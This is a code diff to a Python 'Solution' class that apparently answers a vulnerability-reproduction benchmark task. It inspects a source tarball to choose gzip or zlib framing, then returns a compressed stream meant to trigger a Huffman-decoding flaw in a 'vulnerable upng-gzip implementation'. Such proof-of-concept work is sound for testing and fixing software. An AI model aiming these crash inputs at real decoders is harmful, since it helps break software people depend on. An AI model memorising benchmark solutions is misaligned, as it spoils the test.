@@ -1,48 +1,67 @@
+import os
+import tarfile
 import zlib
 
 
 class Solution:
-    def _generate_gzip_dynamic(self) -> bytes:
-        wbits = 31  # gzip container with deflate
-        best = None
+    def _detect_container(self, src_path: str) -> str:
+        """
+        Heuristically detect whether the target expects gzip or zlib input.
+        Default to gzip for this challenge if detection fails.
+        """
+        container = None
+        try:
+            if not os.path.exists(src_path):
+                return "gzip"
+            with tarfile.open(src_path, "r:*") as tf:
+                for member in tf.getmembers():
+                    if not member.isfile():
+                        continue
+                    name = member.name.lower()
+                    if not (name.endswith(".c") or name.endswith(".h") or
+                            name.endswith(".cpp") or name.endswith(".cc")):
+                        continue
+                    f = tf.extractfile(member)
+                    if f is None:
+                        continue
+                    try:
+                        content = f.read().decode("latin1").lower()
+                    except Exception:
+                        continue
 
-        max_size = 2048
-        size = 1
-        prev_size = 0
+                    if "gzip" in content or ("0x1f" in content and "0x8b" in content):
+                        container = "gzip"
+                        break
+                    if "zlib" in content and container is None:
+                        container = "zlib"
+        except Exception:
+            container = None
 
-        # Find a size where the first deflate block uses dynamic Huffman codes (BTYPE == 2)
-        while size <= max_size:
-            data = b"A" * size
-            cobj = zlib.compressobj(level=9, wbits=wbits)
-            comp = cobj.compress(data) + cobj.flush()
-            if len(comp) > 10:  # 10-byte gzip header
-                first = comp[10]
-                btype = (first >> 1) & 3
-                if btype == 2:
-                    best = comp
-                    break
-            prev_size = size
-            size *= 2
-
-        if best is None:
-            # Fallback: use some gzip-compressed data even if we didn't detect BTYPE=2
-            data = b"A" * 32
-            cobj = zlib.compressobj(level=9, wbits=wbits)
-            return cobj.compress(data) + cobj.flush()
-
-        # Refine search between prev_size+1 and size-1 for a shorter gzip still using dynamic Huffman
-        for s in range(prev_size + 1, size):
-            data = b"A" * s
-            cobj = zlib.compressobj(level=9, wbits=wbits)
-            comp = cobj.compress(data) + cobj.flush()
-            if len(comp) <= 10:
-                continue
-            first = comp[10]
-            btype = (first >> 1) & 3
-            if btype == 2 and len(comp) < len(best):
-                best = comp
-
-        return best
+        if container is None:
+            # For this specific challenge ("upng-gzip"), gzip is the more likely format.
+            container = "gzip"
+        return container
 
     def solve(self, src_path: str) -> bytes:
-        return self._generate_gzip_dynamic()
+        """
+        Generate a PoC input that exercises Huffman decoding in the vulnerable
+        upng-gzip implementation by feeding it a compressed stream that uses
+        DEFLATE Huffman coding via zlib.
+        """
+        container = self._detect_container(src_path)
+
+        # Use sufficiently large data so that the compressor will definitely
+        # use Huffman coding (dynamic or fixed), which triggers the vulnerable
+        # Huffman tree construction logic.
+        data = b"A" * 100
+
+        if container == "gzip":
+            # wbits = 16 + 15 -> gzip wrapper with maximum window size
+            wbits = 16 + 15
+        else:
+            # wbits = 15 -> zlib wrapper with maximum window size
+            wbits = 15
+
+        comp = zlib.compressobj(level=9, wbits=wbits)
+        compressed = comp.compress(data) + comp.flush()
+        return compressed
